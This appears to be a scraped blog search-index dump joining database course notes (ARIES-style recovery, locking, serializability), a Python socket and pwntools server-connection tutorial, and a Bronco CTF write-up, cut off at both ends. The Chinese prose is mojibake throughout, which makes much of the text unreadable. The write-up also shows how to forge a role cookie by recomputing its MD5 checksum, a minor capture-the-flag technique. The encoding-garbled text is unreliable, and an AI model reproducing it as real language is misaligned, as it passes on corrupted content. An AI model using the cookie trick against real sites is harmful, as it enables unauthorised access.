Loserï¼šåœ¨å´©æºƒæ—¶ä»ç„¶å¤„äºæœªæäº¤çŠ¶æ€ï¼Œéœ€è¦Undo Wiederanlauf: Analyse Log-Datei analysieren Winner-Menge ermitteln Loser-Menge ermitteln Redo Undo CLR: Compensating Log Record ç”¨äºè®°å½•æ’¤é”€çš„æ“ä½œã€‚ï¼ˆç»™undoçš„ï¼‰ ç®€å•æ¥è¯´å°±æ˜¯ä¸ºäº†é¢„é˜²æ¢å¤å´©æºƒæ—¶å‘ç”Ÿçš„å…¶ä»–å´©æºƒã€‚ CLR-EintrÃ¤ge: LSN (Log Sequence Number)ï¼šæ—¥å¿—åºåˆ—å· Transaktionskennung(TA_ID) PageID Redoï¼š PrevLSNï¼šä¸Šä¸€ä¸ªæ—¥å¿—è®°å½•çš„æŒ‡é’ˆ UndoNxtLSNï¼šVerweis auf die nÃ¤chste rÃ¼ckgÃ¤ngig zu machende Ã„nderung ï¼ˆå°–æ‹¬å·ï¼‰ æ³¨æ„ï¼šCLRæ²¡æœ‰undoä¿¡æ¯ã€‚ 3ç§Sicherungspunkte(-QualitÃ¤ten)ï¼š transaktionskonsistent ï¼ˆäº‹åŠ¡ä¸€è‡´ï¼‰ æ‰€æœ‰å·²æäº¤çš„äº‹åŠ¡éƒ½è¢«å®Œå…¨å­˜å‚¨ï¼Œæœªæäº¤çš„éƒ½æ²¡æœ‰è¢«å†™å…¥ç£ç›˜ã€‚ï¼ˆåªåœ¨æ‰€æœ‰æ´»è·ƒäº‹åŠ¡å®Œæˆåè¿›è¡Œæ£€æŸ¥ç‚¹è®°å½•ï¼‰ aktionskonsistent ï¼ˆæ“ä½œä¸€è‡´ï¼‰ å¯èƒ½åŒ…å«æœªæäº¤çš„äº‹åŠ¡ï¼Œä½†æ˜¯æ‰€æœ‰æ“ä½œéƒ½æ˜¯å®Œæ•´çš„ã€‚ unscharf (fuzzy) ä¿®æ”¹çš„é¡µé¢ä¸ä¼šç«‹å³å†™å…¥ç£ç›˜ï¼Œåªè®°å½•â€œè„é¡µâ€çš„ä¿¡æ¯ï¼Œè€Œä¸æ˜¯æ•°æ®æœ¬èº« DirtyPages (Menge der modifizierten Seiten, å°šæœªå†™å…¥ç£ç›˜), MinDirtyPageLSN, MinLSN R4-Recovery 10. MehrbenutzersynchronisationFehler (bei unkontroliertem Mehrbenutzerbetrieb): Lost Update: Verlorengegangene Ã„nderungen Dirty Read: AbhÃ¤ngigkeit von nicht freigegebenen Ã„nderungen Phantomproblem HistorieSeiralisierbarkeit 2 Historien Ã¤quivalent: wenn sie die Konfliktoperationen der nicht abgebrochenen Transaktionen in derselben Reihenfolge ausfÃ¼hren. SR: Eine Historie ist serialisierbar wenn sie Ã¤quivalent zu einer seriellen Historie Hs ist. Eine Historie H serialisierbar der zugehÃ¶rige Serialisierbarkeitsgraph SG(H) azyklisch ist. liest von in der Historie H RC: rÃ¼cksetzbare Historie kaskadierendes RÃ¼cksetzen (Cascading Rollback)ï¼š å‡å¦‚T2è¯»å–äº†T1é‡Œè¢«ä¿®æ”¹è¿‡ä½†æ˜¯è¿˜æœªè¢«æäº¤ï¼ˆcommitï¼‰çš„æ•°æ®ï¼Œé‚£ä¹ˆå½“T1 abortçš„æ—¶å€™ï¼Œä¹Ÿéœ€è¦abort T2ã€‚ ACA: Historien ohne kaskadierendes RÃ¼cksetzen (avoiding cascading abort) ST: Strikte Historien æƒ³è¦å¯¹ä¸€ä¸ªè¢«ä¿®æ”¹è¿‡çš„å¯¹è±¡è¿›è¡Œæ“ä½œå‰ï¼Œå¿…é¡»è¦ç¡®ä¿å…¶å·²ç»è¢«commitæˆ–è€…abortäº†ã€‚ Sperrbasierte Synchronisation ï¼ˆé”ï¼‰Sperrmodi: S (shared, read lock) å…è®¸å¤šä¸ªäº‹åŠ¡ï¼ˆTransaktionï¼‰åŒæ—¶è¯»å–æ•°æ®ï¼Œä½†ä¸èƒ½è¿›è¡Œå†™æ“ä½œã€‚ X (exclusive, write lock) å…è®¸äº‹åŠ¡å¯¹æ•°æ®è¿›è¡Œè¯»å–å’Œå†™å…¥ï¼Œä½†å…¶ä»–äº‹åŠ¡ä¸èƒ½åŒæ—¶è®¿é—®è¯¥æ•°æ®ã€‚ VertrÃ¤glichkeitsmatrix / KompatibilitÃ¤tsmatrix: NL S X S âœ…ï¼ˆå…¼å®¹ï¼‰ âœ… âŒ X âœ… âŒï¼ˆä¸å…¼å®¹ï¼‰ âŒ Zwei-Phasen-Sperrprotokoll: Wachstumsphaseï¼šåªè·å–é” Schrumpfphaseï¼šåªé‡Šæ”¾é” Strenges Zwei-Phasen-Sperrprotokoll: æ‰€æœ‰é”ç›´åˆ°äº‹åŠ¡æäº¤ï¼ˆcommitï¼‰æˆ–å›æ»šï¼ˆabortï¼‰åæ‰é‡Šæ”¾ï¼Œé¿å…çº§è”å›æ»šã€‚ Verklemmungen (Deadlocks) Erkennung: Wartegraph Vermeidung: Preclaiming durch Zeitstempel Wound-Wait Strategie Wait-Die Strategie Multi-Granularity Locking (MGL) Phantomproblem: Zugriffsweg sperren Zeitstempel-basierende SynchronisationreadTS(A)ï¼šä¸Šæ¬¡è¯»å– Açš„æ—¶é—´æˆ³ã€‚ writeTS(A)ï¼šä¸Šæ¬¡å†™å…¥ A çš„æ—¶é—´æˆ³ã€‚ Synchronisationsverfahren: å½“ Ti è¯•å›¾è¯»å–æ•°æ® A (ri(A))ï¼š è‹¥ TS(Ti)&lt;writeTS(A)ï¼Œåˆ™ Tiå¿…é¡»è¢«å›æ»šï¼ˆå› ä¸º AAA å¯èƒ½å·²è¢«æ›´æ–°ï¼‰ã€‚ å¦åˆ™ï¼ŒTiå¯ä»¥ç»§ç»­è¯»å–ï¼Œå¹¶æ›´æ–° readTS(A) = max(TS(Ti), readTS(A))ã€‚ å½“ Ti è¯•å›¾å†™å…¥æ•°æ® A (wi(A))ï¼š è‹¥ TS(Ti)&lt;readTS(A)ï¼Œè¯´æ˜åœ¨ Tiä¹‹å‰å·²ç»æœ‰å…¶ä»–äº‹åŠ¡è¯»å–äº† Aï¼Œåˆ™ Ti å¿…é¡»å›æ»šã€‚ è‹¥ TS(Ti)&lt;writeTS(A)ï¼Œè¯´æ˜ Ti è¯•å›¾è¦†ç›–ä¸€ä¸ªæ›´æ–°çš„å€¼ï¼Œå¿…é¡»å›æ»šã€‚ å¦åˆ™ï¼ŒTiå¯ä»¥å†™å…¥ï¼Œå¹¶æ›´æ–° writeTS(A) = TS(Ti)ã€‚ Optimistische Synchronisation Lesephase Validierungsphaseï¼ˆéªŒè¯ï¼‰ Schreibphase Snapshot Isolation Synchronisation von Indexstrukturen: zu aufwendig, redundante Transaktionsverwaltung in SQL92isolation level: read uncommited read commited repeatable read serializable","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Dantenbank æ•°æ®åº“","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/Dantenbank-æ•°æ®åº“","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/tags/Database/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://archer-baiyi.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"}]},{"title":"ä¸æœåŠ¡å™¨çš„äº¤äº’","slug":"CTF/General/ä¸æœåŠ¡å™¨çš„äº¤äº’","date":"2025-03-10T19:22:29.000Z","updated":"2025-07-10T10:51:33.356Z","comments":true,"path":"2025/03/10/CTF/General/ä¸æœåŠ¡å™¨çš„äº¤äº’/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/General/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E4%BA%A4%E4%BA%92/","excerpt":"ä½¿ç”¨socket.socket()ä¸remoteï¼ˆï¼‰è¿æ¥æœåŠ¡å™¨","text":"socket.socketsocket æ˜¯ Python æ ‡å‡†åº“ä¸­çš„æ¨¡å—ï¼Œç”¨äºè¿›è¡Œ TCP/UDP è¿æ¥ã€‚ å‡è®¾æœåŠ¡å™¨åœ°å€æ˜¯ example.comï¼Œç«¯å£æ˜¯ 1234ï¼š 123456789101112131415161718192021import socket# 1. åˆ›å»ºä¸€ä¸ªTCP sockets = socket.socket()# 2. è¿æ¥è¿œç¨‹æœåŠ¡å™¨# connectçš„å‚æ•°è¦æ±‚ä¸ºä¸€ä¸ªtupels.connect((&quot;example.com&quot;, 1234))# 3. å‘é€æ•°æ®ï¼ˆä¾‹å¦‚å‘é€ &quot;Hello&quot;ï¼‰# sendall() é»˜è®¤å‘é€çš„æ˜¯ bytes ç±»å‹çš„æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦ b&quot;&quot; æˆ–è€… &quot;&quot;.encodes.sendall(b&quot;Hello\\n&quot;)# 4. æ¥æ”¶æœåŠ¡å™¨è¿”å›çš„æ•°æ®# è¿™ä¸ªå‚æ•°æŒ‰éœ€è°ƒèŠ‚å°±å¥½data = s.recv(1024) # ä¸€æ¬¡æ¥æ”¶ 1024 å­—èŠ‚print(&quot;Received:&quot;, data.decode())# 5. å…³é—­è¿æ¥s.close() å¦‚æœæœåŠ¡å™¨ä¼šå‘é€éå¸¸å¤šçš„å†…å®¹ï¼Œåˆ™éœ€è¦ä¸€ç›´å¾ªç¯æ¥æ”¶æœåŠ¡å™¨å‘é€çš„æ¶ˆæ¯ï¼š 123456789101112131415161718192021import sockets = socket.socket()s.connect((&quot;example.com&quot;, 1234))# æŒç»­æ¥æ”¶æ•°æ®ï¼Œç›´åˆ°æœåŠ¡å™¨å…³é—­è¿æ¥data = b&quot;&quot; # ç”¨äºå­˜å‚¨å®Œæ•´çš„æ¥æ”¶æ•°æ®while True: part = s.recv(1024) # æ¯æ¬¡è¯»å– 1024 å­—èŠ‚ if not part: # å¦‚æœ part ä¸ºç©ºï¼Œè¡¨ç¤ºæœåŠ¡å™¨å…³é—­è¿æ¥ break data += part # ç´¯åŠ æ•°æ®# æŒ‰è¡Œåˆ†å‰²å¹¶é€è¡Œæ‰“å°lines = data.decode().splitlines()for line in lines: print(line)s.close() ä¹Ÿå¯ä»¥ä½¿ç”¨time.sleep()æ¥ç¡®ä¿æ”¶åˆ°å®Œæ•´ä¿¡æ¯ï¼š 12345678910111213141516import socketimport times = socket.socket()s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)time.sleep(0.5)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() SSLè¿æ¥ SSL è¿æ¥ä¼šæ¯”æ™®é€šçš„TCPè¿æ¥ï¼ˆsocket.socket()ï¼‰å¤šä¸€æ­¥åŠ å¯†çš„æ­¥éª¤ 123456789101112131415161718import socketimport sslsock = socket.socket()# ä½¿ç”¨ SSL åŠ å¯† sockets = ssl.wrap_socket(sock)s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() pwntoolsçš„remotepwntools æ˜¯ä¸“é—¨ä¸º Pwn é¢˜ç›®è®¾è®¡çš„ Python åº“ï¼Œå°è£…äº† socketã€‚ 123456789101112131415from pwn import *# 1. è¿æ¥æœåŠ¡å™¨r = remote(&quot;example.com&quot;, 1234)# 2. å‘é€æ•°æ®r.sendline(b&quot;Hello&quot;) # è‡ªåŠ¨æ·»åŠ  &#x27;\\n&#x27;# 3. æ¥æ”¶æ•°æ®response = r.recvall() # è¯»å–æ‰€æœ‰ä¿¡æ¯# response = r.recvline() # è¯»å–ä¸€æ•´è¡Œprint(&quot;Received:&quot;, response.decode())# 4. å…³é—­è¿æ¥r.close() æ¯”èµ·socketï¼Œpwnæ‹¥æœ‰æ›´é«˜çº§çš„åŠŸèƒ½ï¼š 12345678910r.recvuntil(b&quot;\\n&quot;) #ä¸€ç›´è¯»æ•°æ®ï¼Œç›´åˆ°åŒ¹é…ç‰¹å®šå­—ç¬¦ä¸²ã€‚# p.recvuntil(b&quot;Enter your name:&quot;)r.interactive() # è¿›å…¥äº¤äº’æ¨¡å¼#æ¯”å¦‚è¯´åœ¨pwnçš„é¢˜ç›®é‡Œå¦‚æœæˆåŠŸæ‰“å¼€äº†shellï¼ˆsystem(&quot;/bin/sh&quot;)ï¼‰ï¼Œè¿›å…¥äº¤äº’æ¨¡å¼åˆ™å¯ä»¥ç›´æ¥æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤ã€‚response = r.recvall()# recvallä¼šè‡ªåŠ¨è¯»å–æ‰€æœ‰å¯ç”¨æ•°æ® ç›´åˆ°æœåŠ¡å™¨å…³é—­è¿æ¥ã€‚ä¸å†éœ€è¦åƒåŸç”Ÿ socket é‚£æ ·æ‰‹å†™ while True å¾ªç¯ã€‚r.sendafter(b&quot;input:&quot;, b&quot;1234&quot;) # å…ˆç­‰å¾…æœåŠ¡å™¨å‘é€ input:ï¼Œç„¶åå†å‘é€ 1234 remote() é‡Œä¹Ÿå¯ä»¥å¯ç”¨ SSLï¼š 12345678910from pwn import *r = remote(&quot;example.com&quot;, 1234, ssl=True) # å¼€å¯ SSL åŠ å¯†r.sendline(b&quot;Hello&quot;) # è‡ªåŠ¨æ·»åŠ  &#x27;\\n&#x27;response = r.recvline()print(&quot;Received:&quot;, response.decode())r.close() æ€»çš„æ¥è¯´ï¼Œåœ¨åšCTFé¢˜ç›®æ—¶ï¼Œpwnçš„remoteå¯ä»¥å®Œæˆæ‰€æœ‰ä¸æœåŠ¡å™¨çš„äº¤äº’ã€‚ socket.socketæ²¡æœ‰çš„remoteæœ‰ï¼Œsocket.socketæ²¡æœ‰çš„remoteä¹Ÿæœ‰ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"General","slug":"CTF/General","permalink":"https://archer-baiyi.github.io/categories/CTF/General/"}],"tags":[{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/tags/remote/"}]},{"title":"Bronco CTF Write Up","slug":"CTF/Writeup/Bronco-CTF-Write-Up","date":"2025-03-10T12:28:52.000Z","updated":"2025-03-25T19:31:22.365Z","comments":true,"path":"2025/03/10/CTF/Writeup/Bronco-CTF-Write-Up/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/Writeup/Bronco-CTF-Write-Up/","excerpt":"Bronco CTFæ¯”èµ›çš„é¢˜è§£ï¼Œæ¶‰åŠæ–¹å‘ï¼šCrypto, Web, Reverse, Steg, Misc, Forensics","text":"BeginnerBreak the Battalion è¿™é“é¢˜æˆ‘ä»¬ä¼šæ‹¿åˆ°ä¸€ä»½ELFæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨IDAæ‰“å¼€å®ƒä¼šçœ‹åˆ° å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªç¨‹åºçš„æ ¸å¿ƒå†…å®¹æ˜¯encryptï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å®ƒçš„å†…å®¹ï¼š å†™ä¸€æ®µpythonä¾¿å¯ä»¥ç®€å•å¾—çŸ¥è¾“å…¥ä»€ä¹ˆå†…å®¹æœ€åä¼šè¾“å‡ºâ€œbrigadeâ€ï¼š 12345678def decrypt(encrypted): return &#x27;&#x27;.join(chr(ord(c) ^ 0x50) for c in encrypted)encrypted = &quot;brigade&quot;original_input = decrypt(encrypted)print(f&quot;Original input: &#123;original_input&#125;&quot;)# Original input: 2&quot;97145 æ‰€ä»¥flagä¸ºï¼š 1bronco&#123;2&quot;97145&#125; (åæ§½ä¸€ä¸‹ï¼Œè¿™ä¸ªflagçš„å†…å®¹çœŸçš„éå¸¸å¥‡æ€ªï¼Œä¸€èˆ¬éƒ½æ˜¯ä¼šå¸¦ç‚¹æ­£å¸¸å•è¯çš„ã€‚) Simon Says è¿™é“é¢˜æˆ‘ä»¬ä¼šæ‹¿åˆ°è¿™æ ·ä¸€å¼ å›¾ç‰‡ï¼š å¹¶æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„å†…å®¹ã€‚æ ¹æ®é¢˜ç›®æè¿°æˆ‘ä»¬çŒœæµ‹è¿™é“é¢˜ç”¨äº†LSBéšå†™ï¼Œæ‰€ä»¥ç”¨Stegsolveæ‰“å¼€å›¾ç‰‡ä¾¿å¯å¾—åˆ°ï¼š flagä¸ºï¼š 1bronco&#123;simon_says_submit_this_flag&#125; Too Many Emojisè¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸²emojiå†…å®¹ï¼š å› ä¸ºçŸ¥é“flagçš„æ ¼å¼ä¸ºbronco{}ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šè¿™ä¸ªåº”è¯¥æ˜¯å•è¡¨åŠ å¯†ï¼Œå¹¶ä¸”çŸ¥é“å‰6ä¸ªemojiå¯¹åº”çš„æ˜æ–‡ã€‚ ç»è¿‡ä¸€ç³»åˆ—æœç´¢ä¸æ’æŸ¥å¯ä»¥å‘ç°æ¯ä¸€ä¸ªemojiå¯¹åº”çš„å­—æ¯ä¸ºè¿™ä¸ªemojiçš„å®˜æ–¹è‹±æ–‡åçš„é¦–å­—æ¯ï¼Œæ ¹æ®è¿™ä¸ªçº¿ç´¢æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰¾åˆ°çš„è¿™äº›ä¿¡æ¯æ¥è§£å¯†å†…å®¹ï¼š ï¼ˆç”¨åˆ°çš„ç½‘ç«™ï¼šhttps://unicode.org/emoji/charts/full-emoji-list.htmlï¼‰ è¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼šå¦‚æœæ‰¾ä¸åˆ°æƒ³è¦çš„ emojiï¼Œå¯ä»¥æè¿°ç»™ ChatGPT å¹¶è¯¢é—®å…¶å®˜æ–¹åç§°ï¼Œå†åˆ°ç½‘ç«™ä¸Šç”¨åç§°ï¼ˆæˆ–éƒ¨åˆ†åç§°ï¼‰æœç´¢ï¼Œç¡®è®¤æ˜¯å¦æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚ æœ€åå¾—åˆ°flagï¼š 1bronco&#123;emojis_express_my_emotions&#125; Straight Up Circular è¿™é“é¢˜ç»™å‡ºçš„åŠ å¯†å­—ç¬¦ä¸²å¦‚ä¸‹ï¼š 1dvlby_otspnr&#123;cobrnot450i1nm_e03&#125; é¦–å…ˆï¼Œé€šè¿‡ &#123;&#125; çš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­è¿™å¹¶ä¸æ˜¯æ›¿æ¢åŠ å¯†ã€‚å…¶æ¬¡ï¼Œæˆ‘ä»¬å‘ç° bronco&#123;&#125;ï¼ˆè¯¥æ¯”èµ›çš„ flag ç»Ÿä¸€æ ¼å¼ï¼‰ä¸­çš„æ¯ä¸ªå­—æ¯å’Œç¬¦å·éƒ½å‡ºç°åœ¨äº†è¿™ä¸²å­—ç¬¦ä¸²ä¸­ï¼Œå› æ­¤å¾ˆå¯èƒ½æ˜¯æŸç§ä¹±åºåŠ å¯†ã€‚ å…ˆç¡®å®š bã€rã€o ç­‰å­—æ¯åœ¨åŠ å¯†å­—ç¬¦ä¸²ä¸­çš„å…·ä½“ä½ç½®ï¼Œå†æ ¹æ®é¢˜ç›®åå­—ï¼ˆStraight Up Circularï¼‰ä¸éš¾å‘ç°è¿™ä¸ªç”¨è¿™ä¸ªè§„å¾‹å¯ä»¥å¾—åˆ°çš„flagå¼€å¤´ï¼š ä»å­—ç¬¦ä¸²æ­£ä¸­é—´çš„ b å‡ºå‘ å…ˆå‘å³ç§»åŠ¨ 1 ä½ å†å‘å·¦ç§»åŠ¨ 2 ä½ æ¥ç€å‘å³ç§»åŠ¨ 3 ä½ ä¾æ­¤ç±»æ¨â€¦â€¦ ç»§ç»­è¿™ä¸ªæµç¨‹ä¾¿å¯ä»¥æˆåŠŸè·å¾—flagï¼š 1bronco&#123;tr4n5p0sit1on_my_bel0v3d&#125; CryptoAcross the Tracks æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€æ®µå†…å®¹ï¼š 1SamddreÂ·Â·athÂ·dhf@_oesoereÂ·ebunÂ·yhotÂ·noÂ·Â·osoÂ·iÂ·aÂ·lr1rcmÂ·iSÂ·arufÂ·toibadhnÂ·nadpikudynea&#123;l_oeeeÂ·chÂ·oideÂ·fÂ·nÂ·aoeÂ·saeÂ·aonbdhgo_soÂ·rr.iÂ·tYnlÂ·sÂ·tdotÂ·xsÂ·hdtyy&#x27;Â·.tÂ·cfrlcaÂ·epeoÂ·iufiyi.tÂ·yaafÂ·.a.Â·tsÂ·Â·tn33&#125;iÂ·tvhrÂ·.toohoÂ·Â·Â·rlmwuIÂ·hÂ·eÂ·iHshonppsoleaseecrtudIdet.Â·nÂ·BtIpdheiorcihrÂ·orÂ·ovlÂ·cÂ·Â·iÂ·acnÂ·tÂ·suÂ·Â·ootrÂ·:b3cesslyedheIathÂ·eÂ·_ æ ¹æ®é¢˜ç›®æè¿°æˆ‘ä»¬çŒœæµ‹è¿™æ®µå†…å®¹ä½¿ç”¨äº†æ …æ å¯†ç ï¼Œå¹¶ä¸”keyä¸ºé¢˜ç›®æè¿°ä¸­æåˆ°çš„â€œtenthâ€ï¼ˆ10ï¼‰ã€‚è§£å¯†å³å¯å¾—åˆ°flagï¼š 1bronco&#123;r@1l_f3nc3_cip3rs_r_cool&#125; Rahhh-SA è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š 1234e = 65537n = 3429719c = [-53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]p = -811 é¦–å…ˆæ³¨æ„åˆ°cçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯è´Ÿæ•°ï¼Œä½†æ˜¯å…¶ç»å¯¹å€¼éƒ½å°äºç­‰äºnï¼Œæ‰€æœ‰çŒœæµ‹å°†å…¶ç›´æ¥æ”¾è¿› $\\mathbb{Z}/n\\mathbb{Z}$ è¿›è¡Œè®¡ç®—å³å¯ã€‚ä½†å› ä¸ºå‘ç°$pâ€™ := n+p = 3,428,908$ å¹¶ä¸æ˜¯nçš„å› æ•°ï¼Œæ‰€ä»¥å°è¯• $3429719/811=4229$ ï¼Œå‘ç°ç»“æœä¸ºæ•´æ•°ã€‚ æ‰€ä»¥å†™ä¸€æ®µpythonä»£ç æ¥å°è¯•RSAè§£ç å³å¯ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3e = 65537n = 3429719p = 811 # é¢˜ä¸­å†™çš„æ˜¯ -811ï¼Œè¿™é‡Œåªå–ç»å¯¹å€¼q = n // p # 4229# è®¡ç®— phi(n)phi = (p - 1) * (q - 1) # (811 - 1)*(4229 - 1) = 810*4228 = 3424680# æ±‚ d = e^-1 mod phi(n)# Python 3.8+ å¯ä»¥ç›´æ¥ç”¨ pow(e, -1, phi) å¾—åˆ°æ¨¡é€†d = pow(e, -1, phi)# ç»™å‡ºçš„è´Ÿæ•°å¯†æ–‡c_list = [ -53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]# è§£å¯†plaintext_nums = []for c in c_list: # å…ˆæŠŠè´Ÿæ•°è½¬ä¸º mod n å†…çš„éè´Ÿä»£è¡¨å…ƒ c_mod = c % n m = pow(c_mod, d, n) plaintext_nums.append(m)message = &#x27;&#x27;.join(chr(m) for m in plaintext_nums)print(&quot;è§£å¯†åå¾—åˆ°çš„æ•°å€¼:&quot;, plaintext_nums)print(&quot;å°è¯•æ˜ å°„åˆ°å­—ç¬¦åçš„ç»“æœ:&quot;)print(message)# bronco&#123;m4th3m4t1c5_r34l1y_1s_qu1t3_m4g1c4l_raAhH!&#125; WebGrandmaâ€™s Secret Recipe ï¼ˆå› ä¸ºè¿™ä»½é£Ÿè°±ç¦»å©šäº†å®åœ¨æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼‰ ç‚¹å‡»ç½‘ç«™å¯ä»¥çœ‹åˆ°ï¼š ç‚¹å¼€Cookieå¯ä»¥å‘ç°æœ‰2æ¡å†…å®¹ï¼š 12checksum: a223befb6660a23f9c3491f74ef84e43role: &quot;kitchen helper&quot; ç»“æœæ£€æŸ¥å‘ç°checksumä¸ºroleçš„md5ç»“æœï¼š æ‰€ä»¥æˆ‘ä»¬å°†roleæ”¹ä¸ºï¼šâ€grandmaâ€ï¼Œå¹¶ä¸”å°†checksumæ”¹ä¸ºa5d19cdd5fd1a8f664c0ee2b5e293167ï¼ˆ=md5(grandma))ã€‚ç‚¹å‡»â€œGrandmaâ€™s Pantryâ€œä¾¿å¯ä»¥çœ‹åˆ°ï¼š å¾—åˆ°flagï¼š 1bronco&#123;grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact&#125; ReverseReversing for Ophidiophiles è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š 123a326c27bee9b40885df97007aa4dbe410e93 1234567891011121314flag = input()carry = 0key = &quot;Awesome!&quot;output = []for i,c in enumerate(flag): val = ord(c) val += carry val %= 256 val ^= ord(key[i % len(key)]) output.append(val) carry += ord(c) carry %= 256print(bytes(output).hex()) ç›´æ¥ç”¨pythonå†™ä¸€æ®µé€†å‘çš„ç®—æ³•ä¾¿å¯ä»¥å¾—åˆ°flagï¼š 123456789101112131415encrypted_hex = &quot;23a326c27bee9b40885df97007aa4dbe410e93&quot;encrypted_bytes = bytes.fromhex(encrypted_hex)carry = 0key = &quot;Awesome!&quot;flag = []for i, val in enumerate(encrypted_bytes): val ^= ord(key[i % len(key)]) # é€†å‘ XOR æ“ä½œ val = (val - carry + 256) % 256 # é€†å‘ carry è®¡ç®— flag.append(chr(val)) carry = (carry + val) % 256 # é‡æ–°è®¡ç®— carry å€¼print(&quot;&quot;.join(flag))# bronco&#123;charge_away&#125; theflagishere! è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä»½Python ç¼–è¯‘åçš„å­—èŠ‚ç æ–‡ä»¶ â€œtheflagishere.pycâ€ï¼Œæˆ‘ä»¬é¦–å…ˆç”¨è¿™ä¸ªç½‘ç«™å°†å…¶åæ±‡ç¼–ï¼š https://www.lddgo.net/string/pyc-compile-decompile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.9def what_do_i_do(whoKnows): a_st = &#123; &#125; for a in whoKnows: if a_st.get(a) == None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] continue return (not_a_variable_name, variable_name)def char_3(): return &#x27;m&#x27;def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def i_am_a_function(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 newVariable = variableName * i newVariable += 100 variableName /= i + 1 return chr(ord(chr(int(variableName))))def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;def i(): return &#x27;free_flag_f&#x27;def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_7(): return 